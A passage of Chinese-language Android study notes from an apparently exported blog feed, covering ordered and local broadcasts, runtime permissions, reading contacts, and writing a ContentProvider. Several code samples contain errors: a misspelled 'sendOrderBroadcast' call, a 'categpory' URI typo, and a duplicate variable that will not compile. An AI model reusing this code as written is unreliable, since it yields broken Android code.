<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnotherBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"received in AnotherBroadcastReceiver"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后继续添加intent-filter标签：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后返回刚才按钮的界面发送广播，即可得证我们的应用程序发出的广播是可以被其他应用程序接收到的。</p>
<p>回到BroadcastTest项目中，修改如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button button = (Button) findViewById(R.id.button);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span>);</span><br><span class="line">            sendOrderBroadcast(intent, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sendOrderBroadcast()用于发送有序广播，第二个参数是一个与权限有关的字符串。不过光是这样还不够，因为没有截断，所以还是会像标准广播一样两边都接收到，所以要再做以下修改：</p>
<p>修改MyBroadcastReceiver的标签内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyBroadcastReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>设置优先级为100。再修改MyBroadcastReceiver代码为如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"I have received"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        abortBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用abortBroadcast()方法来截断这条广播。</p>
<p>这样就可以验证为有序广播了。</p>
<h2 id="使用本地广播"><a href="#使用本地广播" class="headerlink" title="使用本地广播"></a>使用本地广播</h2><p>前面接收和发送的广播全部属于系统全局广播，即发出的广播可以被其他任何应用程序接收到，并且也可以接收来自其他任何应用程序的广播。</p>
<p>本地广播发出的广播则只能在应用程序的内部进行传递，并且广播接收器也只能接收来自本应用程序发出的广播。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line">       </span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.LOCAL_BROADCAST"</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">"com.example.broadcasttest.LOCAL_BROADCAST"</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> LocalReceiver();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LocalReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">"received local broadcast"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以完成发送com.example.broadcasttest.LOCAL_BROADCAST这条广播，并在localReceiver里去接收这条广播的功能。</p>
<p>注意，本地广播是无法通过静态注册的方式来接收的。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android的广播分为两类：标准广播和有序广播。标准广播无法被截断，而有序广播中低优先级的接收器可以被高优先级的接收器截断广播。注册广播的方式有两类，动态注册和静态注册，其中动态注册的广播接收器必须要在程序启动后才能接收，而静态注册则不受限制，可以做到接收手机开机的广播。最后还有本地广播，可以限制广播只在当前应用程序中传播，并且可以限制只接收当前应用程序的广播。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day6</title>
    <url>/2020/06/01/Android/Android-day6/</url>
    <content><![CDATA[<h1 id="内容提供器探究"><a href="#内容提供器探究" class="headerlink" title="内容提供器探究"></a>内容提供器探究</h1><h2 id="内容提供器简介"><a href="#内容提供器简介" class="headerlink" title="内容提供器简介"></a>内容提供器简介</h2><p>内容提供器主要用于在不同的应用程序之间实现数据共享的功能，并且保证被访问数据的安全性。</p>
<h2 id="运行时权限"><a href="#运行时权限" class="headerlink" title="运行时权限"></a>运行时权限</h2><p>Android6.0系统中引入了运行时权限。</p>
<h3 id="Android权限机制详解"><a href="#Android权限机制详解" class="headerlink" title="Android权限机制详解"></a>Android权限机制详解</h3><p>运行时权限即可以在软件的使用过程中再对某一项权限申请授权。</p>
<p>Android的权限归为两类：<br>普通权限：不会直接威胁到用户的安全和隐私的权限。对于这部分权限申请，系统会自动帮我们进行授权。</p>
<p>危险权限：可能会触及用户隐私，或对设备安全性造成影响的权限。必须由用户手动点击授权才可以。</p>
<p>当用户同意授权某一危险权限时，则其权限组中其他权限也会同时被授权。</p>
<p>危险权限表：</p>
<p><img src="./day6/1.jpg" alt=""></p>
<p>可以访问<a href="http://developer.android.com/reference/android/Manifest.premission.html查看Android系统中的完整权限列表。" target="_blank" rel="noopener">http://developer.android.com/reference/android/Manifest.premission.html查看Android系统中的完整权限列表。</a></p>
<h3 id="在程序运行时申请权限"><a href="#在程序运行时申请权限" class="headerlink" title="在程序运行时申请权限"></a>在程序运行时申请权限</h3><p>新建一个RuntimePermissionTest项目。</p>
<p>添加按钮，并修改代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button make_call = (Button) findViewById(R.id.make_call);</span><br><span class="line">    make_call.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Intent intent =<span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">                intent.setData(Uri.parse(<span class="string">"tel:10086"</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SecurityException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并添加权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>编译运行后，在Android4.4版本中点击按钮后可以发现自动打开了拨号界面。但是</p>
<p>在Android6.0版本中，点击按钮没有任何反应，查看logcat中断日志，可以看到：<code>java.lang.SecurityException: Permission Denial: starting Intent</code>的字样。</p>
<p>这是因为6.0以上的系统在使用危险权限时都必须进行运行时权限处理。</p>
<p>修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button make_call = (Button) findViewById(R.id.make_call);</span><br><span class="line">        make_call.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123; Manifest.permission.CALL_PHONE&#125;, <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">            intent.setData(Uri.parse(<span class="string">"tel:10086"</span>));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions, <span class="keyword">int</span>[] grantResults)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"you denied the permission"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行后点击按钮，在6.0版本以上就会弹出授权窗口（第一授权后，继续点击则默认已授权，需卸载后才会恢复权限设置，或者在权限设置关闭权限），同意后就会自动跳转到拨号界面了。其中ActivityCompat.requestPermissions()的第三个参数为请求码，用于下面重写函数onRequestPermissionsResult()的switch。</p>
<h2 id="访问其他程序中的数据"><a href="#访问其他程序中的数据" class="headerlink" title="访问其他程序中的数据"></a>访问其他程序中的数据</h2><p>内容提供器的用法一般有两种，一种是使用现有的内容提供器来读取和操作相应程序中的数据；另一种是创建自己的内容提供器给我们程序的数据提供外部访问接口。</p>
<p>如果一个应用程序通过内容提供器对其数据提供了外部访问接口，那么任何其他的应用程序就都可以对这部分数据进行访问。</p>
<h3 id="ContentResolver的基本用法"><a href="#ContentResolver的基本用法" class="headerlink" title="ContentResolver的基本用法"></a>ContentResolver的基本用法</h3><p>ContentResolver提供了一系列方法用于对数据进行CRUD操作，可以用Context中的getContentResolver()方法获取该类的实例</p>
<p>ContentResolver中的增删改查方法都是不接收表名参数的，而是用一个Uri参数代替，这个参数被称为内容URI。</p>
<p>内容URI给内容提供器中的数据建立了唯一标识符，它主要由两部分组成：authority和path。authority用于对不同的应用程序做区分，path则是用于对同一应用程序中不同的表做区分，通常会添加到authority后面。内容URI最标注的格式写法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content:&#x2F;&#x2F;com.example.app.provide&#x2F;table1</span><br></pre></td></tr></table></figure>

<h3 id="读取系统联系人"><a href="#读取系统联系人" class="headerlink" title="读取系统联系人"></a>读取系统联系人</h3><p>新建一个ContactsTest项目，修改布局文件为如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/contacts_view"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ArrayAdapter&lt;String&gt; adapter;</span><br><span class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ListView contactsView = (ListView) findViewById(R.id.contacts_view);</span><br><span class="line">        adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout.simple_list_item_1, contactsList);</span><br><span class="line">        contactsView.setAdapter(adapter);</span><br><span class="line">        <span class="keyword">if</span>(ContextCompat.checkSelfPermission(<span class="keyword">this</span>, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;Manifest.permission.READ_CONTACTS&#125;, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            readContacts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</span><br><span class="line">                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));</span><br><span class="line">                    contactsList.add(displayName + <span class="string">"\n"</span> + number);</span><br><span class="line">                &#125;</span><br><span class="line">                adapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)&#123;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions, <span class="keyword">int</span>[] grantResults)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    readContacts();</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"You denied the permission"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且添加权限声明：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后编译运行并授权就可以了。</p>
<h2 id="创建自己的内容提供器"><a href="#创建自己的内容提供器" class="headerlink" title="创建自己的内容提供器"></a>创建自己的内容提供器</h2><h3 id="创建内容提供器的步骤"><a href="#创建内容提供器的步骤" class="headerlink" title="创建内容提供器的步骤"></a>创建内容提供器的步骤</h3><p>打开DataTest项目，去掉MyDatabaseHelper中的Toast提示，因为跨程序访问时我们不能直接使用Toast。</p>
<p>新建Content Provider，命名为DatabaseProvider，authority指定为com.example.databasetest.provider，修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseProvider</span> <span class="keyword">extends</span> <span class="title">ContentProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_DIR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_ITEM = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGORY_DIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGROY_ITEM = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String AUTHORITY = <span class="string">"com.example.databasetest.provider"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> UriMatcher uriMatcher;</span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        uriMatcher = <span class="keyword">new</span> UriMatcher(UriMatcher.NO_MATCH);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"book"</span>, BOOK_DIR);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"book/#"</span>, BOOK_ITEM);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"categpory"</span>, CATEGORY_DIT);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"category/#"</span>, CATEGROY_ITEM);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dbHelper = <span class="keyword">new</span> MyDatabaseHelper(getContext(),<span class="string">"BookStore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri uri, String[] projection, String selection,</span></span></span><br><span class="line"><span class="function"><span class="params">                        String[] selectionArgs, String sortOrder)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getReadableDatabase();</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                cursor = db.query(<span class="string">"Book"</span>, projection, selection, selectionArgs, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">"Book"</span>, projection, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                cursor = db.query(<span class="string">"Category"</span>, projection, selection, selectionArgs, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">"Category"</span>, projection, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cursor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Uri <span class="title">insert</span><span class="params">(Uri uri, ContentValues values)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        Uri uriReturn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newBookId = db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">"content://"</span> + AUTHORITY + <span class="string">"/book/"</span> + newBookId);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newBookId = db.insert(<span class="string">"Category"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">"content://"</span> + AUTHORITY + <span class="string">"/category/"</span> + newBookId);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uriReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(Uri uri, ContentValues values, String selection,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> updatedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                updatedRows = db.update(<span class="string">"Book"</span>, values, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">"Book"</span>, values, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> 